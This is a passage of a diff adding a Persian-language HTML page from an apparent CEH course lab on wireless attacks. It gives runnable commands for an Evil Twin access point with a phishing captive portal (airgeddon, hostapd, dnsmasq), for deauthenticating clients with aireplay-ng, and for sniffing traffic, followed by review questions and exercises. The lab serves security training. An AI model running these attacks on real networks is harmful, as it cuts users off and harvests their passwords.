+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo airodump-ng wlan0mon</code></pre>
+            </div>
+            <div class="output-box">
+                <span dir='ltr' class="success-text">00:11:22:33:44:55  -35  124    1   WPA2  MyHomeWiFi</span>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-attack">حمله</span>
+            <h3>ایجاد Access Point جعلی با airgeddon</h3>
+            <p><b>airgeddon</b> یک ابزار جامع برای حملات بی‌سیم است که Evil Twin را به‌صورت خودکار انجام می‌دهد.</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
+cd airgeddon
+sudo ./airgeddon.sh</code></pre>
+            </div>
+            <p>مراحل در airgeddon:</p>
+            <ol>
+                <li>رابط wlan0mon را انتخاب کنید.</li>
+                <li>گزینه <b>Evil Twin Attacks</b> را انتخاب کنید.</li>
+                <li>گزینه <b>Evil Twin with Captive Portal</b> یا <b>Evil Twin with Sniffing</b> را انتخاب کنید.</li>
+                <li>شبکه هدف را انتخاب کنید.</li>
+                <li>پس از اتمام، صفحه فیشینگ روی AP جعلی فعال می‌شود.</li>
+            </ol>
+            <div class="info-box">
+                <b>📌 توضیح:</b> airgeddon یک AP جعلی با SSID مشابه ایجاد می‌کند و کاربران را به آن متصل می‌کند. سپس می‌توانید رمزهای عبور و اطلاعات را جمع‌آوری کنید.
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۳</span>
+            <span dir='ltr' class="phase-badge phase-attack">حمله</span>
+            <h3>روش دستی با hostapd و dnsmasq</h3>
+            <p>برای درک عمیق‌تر، می‌توانید Evil Twin را به‌صورت دستی ایجاد کنید:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'># ۱. تنظیم hostapd.conf
+echo 'interface=wlan0mon
+ssid=MyHomeWiFi
+channel=1
+wpa=2
+wpa_passphrase=abc123' > hostapd.conf
+
+# ۲. اجرای hostapd
+sudo hostapd hostapd.conf
+
+# ۳. تنظیم dnsmasq.conf برای DHCP
+echo 'interface=wlan0mon
+dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h' > dnsmasq.conf
+
+# ۴. اجرای dnsmasq
+sudo dnsmasq -C dnsmasq.conf</code></pre>
+            </div>
+            <div class="warning-box">
+                <b>⚠️ هشدار:</b> حمله Evil Twin بسیار مؤثر است و می‌تواند اطلاعات حساسی را به سرقت ببرد. فقط در محیط‌های آزمایشگاهی اجرا کنید.
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۹: حمله Deauthentication -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📡 سناریو ۵: حمله Deauthentication</h2>
+        <p>
+            <b>Deauth Attack</b> یک حمله ساده اما مؤثر است که با ارسال بسته‌های Deauth، کلاینت‌ها را از شبکه قطع می‌کند. این حمله معمولاً برای گرفتن Handshake یا اجرای Evil Twin استفاده می‌شود.
+        </p>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-attack">حمله</span>
+            <h3>قطع اتصال یک کلاینت خاص</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon</code></pre>
+            </div>
+            <div class="info-box">
+                <b>📌 توضیح گزینه‌ها:</b>
+                <ul>
+                    <li><code dir='ltr'>-0 5</code> – ارسال ۵ بسته Deauth</li>
+                    <li><code dir='ltr'>-a</code> – BSSID Access Point</li>
+                    <li><code dir='ltr'>-c</code> – MAC کلاینت هدف</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-attack">حمله</span>
+            <h3>قطع اتصال همه کلاینت‌ها</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon</code></pre>
+            </div>
+            <div class="warning-box">
+                <b>⚠️ هشدار:</b> حمله Deauth مداوم (با <code dir='ltr'>-0 0</code>) باعث می‌شود کلاینت‌ها نتوانند به شبکه متصل شوند و ممکن است شبکه را از کار بیندازد.
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۰: شنود و تحلیل ترافیک -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>👁️ سناریو ۶: شنود ترافیک بی‌سیم</h2>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۱</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>ضبط ترافیک با airodump-ng</h3>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w sniff wlan0mon</code></pre>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <span dir='ltr' class="badge">گام ۲</span>
+            <span dir='ltr' class="phase-badge phase-scan">اسکن</span>
+            <h3>تحلیل با Wireshark</h3>
+            <p>فایل ضبط شده را با Wireshark باز کنید:</p>
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyCode(this)">📋 کپی</button>
+                <pre dir='ltr'><code dir='ltr'>wireshark sniff-01.cap</code></pre>
+            </div>
+            <p>فیلترهای مفید در Wireshark برای وای‌فای:</p>
+            <ul>
+                <li><code dir='ltr'>wlan.fc.type == 2</code> – بسته‌های داده (Data)</li>
+                <li><code dir='ltr'>wlan.fc.type_subtype == 8</code> – بسته‌های Beacon</li>
+                <li><code dir='ltr'>eapol</code> – بسته‌های Handshake</li>
+                <li><code dir='ltr'>wlan.fc.type_subtype == 12</code> – بسته‌های Deauth</li>
+            </ul>
+            <div class="tip-box">
+                <b>💡 نکته:</b> با Wireshark می‌توانید جزئیات کامل بسته‌های وای‌فای را در تمام لایه‌ها مشاهده کنید.
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۱: جمع‌بندی و سوالات -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>📝 جمع‌بندی و سوالات</h2>
+
+        <div class="highlight-box">
+            <b>💡 خلاصه آزمایشگاه:</b>
+            <p>
+                در این آزمایشگاه، شما با مهم‌ترین حملات به شبکه‌های بی‌سیم آشنا شدید:
+            </p>
+            <ul>
+                <li><b>کرک WEP:</b> با جمع‌آوری IV و Aircrack-ng</li>
+                <li><b>کرک WPA/WPA2:</b> با ضبط Handshake و دیکشنری</li>
+                <li><b>حمله به WPS:</b> با Reaver و Bully</li>
+                <li><b>Evil Twin:</b> با airgeddon و hostapd</li>
+                <li><b>Deauth Attack:</b> برای قطع اتصال کلاینت‌ها</li>
+                <li><b>شنود ترافیک:</b> با airodump-ng و Wireshark</li>
+            </ul>
+        </div>
+
+        <h3>❓ سوالات برای بررسی درک</h3>
+
+        <div class="question-box">
+            <strong>سوال ۱:</strong> چرا WEP به راحتی قابل شکستن است؟ چه ضعف‌هایی دارد؟
+        </div>
+
+        <div class="question-box">
+            <strong>سوال ۲:</strong> تفاوت بین WPA و WPA2 چیست؟ چرا WPA2 امن‌تر است؟
+        </div>
+
+        <div class="question-box">
+            <strong>سوال ۳:</strong> در حمله به WPA/WPA2، چرا به Handshake نیاز داریم و چگونه می‌توان آن را دریافت کرد؟
+        </div>
+
+        <div class="question-box">
+            <strong>سوال ۴:</strong> چگونه می‌توان از حملات Evil Twin جلوگیری کرد؟ چه اقداماتی باید انجام داد؟
+        </div>
+
+        <div class="question-box">
+            <strong>سوال ۵:</strong> WPS چیست و چرا خطرناک است؟ بهترین راه برای ایمن‌سازی آن چیست؟
+        </div>
+
+        <div class="tip-box">
+            <b>💡 پاسخ‌ها را در فایل گزارش خود مستند کنید.</b>
+            <p>
+                برای هر سوال، پاسخ خود را با توجه به تجربه‌ای که در این آزمایشگاه به دست آورده‌اید، بنویسید.
+            </p>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۲: تمرین‌های اضافی -->
+    <!-- ============================================================ -->
+    <div class="card">
+        <h2>🧪 تمرین‌های اضافی</h2>
+        <p>
+            برای تسلط بیشتر، تمرین‌های زیر را نیز انجام دهید:
+        </p>
+        <ul>
+            <li><b>تمرین ۱:</b> با استفاده از <code dir='ltr'>macchanger</code>، آدرس MAC خود را تغییر دهید و یک اسکن مجدد انجام دهید.</li>
+            <li><b>تمرین ۲:</b> یک شبکه وای‌فای با رمز قوی (۲۰ کاراکتر) تنظیم کنید و سعی کنید آن را با Aircrack-ng کرک کنید (تأثیر رمز قوی را مشاهده کنید).</li>
+            <li><b>تمرین ۳:</b> با استفاده از <code dir='ltr'>kismet</code>، یک اسکن پیشرفته از شبکه‌های بی‌سیم انجام دهید.</li>
+            <li><b>تمرین ۴:</b> حمله Evil Twin را با airgeddon روی شبکه خود اجرا کنید و نحوه عملکرد آن را مشاهده کنید.</li>
+            <li><b>تمرین ۵:</b> با استفاده از <code dir='ltr'>wifi-phisher</code>، یک حمله Evil Twin با صفحه فیشینگ اجرا کنید.</li>
+            <li><b>تمرین ۶:</b> WPA3 را روی یک روتر جدید فعال کنید و روش‌های حمله به آن را تحقیق کنید.</li>
+        </ul>
+        <div class="highlight-box">
+            <b>📌 گام بعدی:</b>
+            <p>
+                پس از اتمام این آزمایشگاه، می‌توانید به سراغ
+                <a href="../../05_Assessments/Final_Project/index.html" style="color:#2a7de1;font-weight:bold;">پروژه نهایی</a> بروید و تمام مهارت‌های خود را ترکیب کنید.
+            </p>
+        </div>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
+        <p style="font-size:0.8rem; margin-top:6px;">آزمایشگاه: Wireless Hacking | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+    <!-- ===== اسکریپت کپی ===== -->
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            if (!codeBlock) return;
+            const codeElement = codeBlock.querySelector('code');
+            if (!codeElement) return;
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btn.innerText;
+                btn.innerText = '✅ کپی شد!';
+                setTimeout(() => {
+                    btn.innerText = original;
+                }, 2000);
+            }).catch(() => {
+                alert('خطا در کپی کردن متن');
+            });
+        }
+    </script>
+
+</body>
+</html>
